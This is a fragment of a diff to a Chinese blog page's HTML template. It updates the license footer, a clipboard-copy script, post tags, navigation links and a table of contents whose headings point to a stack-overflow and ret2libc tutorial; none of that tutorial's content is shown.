+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+	});
+    });  
+</script>
+
 
       </div>
     
@@ -617,9 +648,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a>
-          
             <a href="/tags/栈溢出/" rel="tag"><i class="fa fa-tag"></i> 栈溢出</a>
+          
+            <a href="/tags/安全/" rel="tag"><i class="fa fa-tag"></i> 安全</a>
           
         </div>
       
@@ -632,8 +663,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/05/01/Linux-权能机制/" rel="next" title="Linux 权能机制">
-                <i class="fa fa-chevron-left"></i> Linux 权能机制
+              <a href="/2018/05/03/MIPS-CPU单周期设计/" rel="next" title="MIPS CPU单周期设计">
+                <i class="fa fa-chevron-left"></i> MIPS CPU单周期设计
               </a>
             
           </div>
@@ -641,10 +672,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/05/03/MIPS-CPU单周期设计/" rel="prev" title="MIPS CPU单周期设计">
-                MIPS CPU单周期设计 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -835,7 +862,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#目的"><span class="nav-number">1.</span> <span class="nav-text">目的</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#要求"><span class="nav-number">2.</span> <span class="nav-text">要求</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实例"><span class="nav-number">3.</span> <span class="nav-text">实例</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#准备工作"><span class="nav-number">1.</span> <span class="nav-text">准备工作</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#三种保护机制"><span class="nav-number">1.0.1.</span> <span class="nav-text">三种保护机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc"><span class="nav-number">1.0.2.</span> <span class="nav-text">ret2libc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞程序"><span class="nav-number">1.0.3.</span> <span class="nav-text">漏洞程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#结果"><span class="nav-number">1.0.4.</span> <span class="nav-text">结果</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">1.0.5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用程序"><span class="nav-number">1.0.6.</span> <span class="nav-text">利用程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考资料"><span class="nav-number">1.0.7.</span> <span class="nav-text">参考资料</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
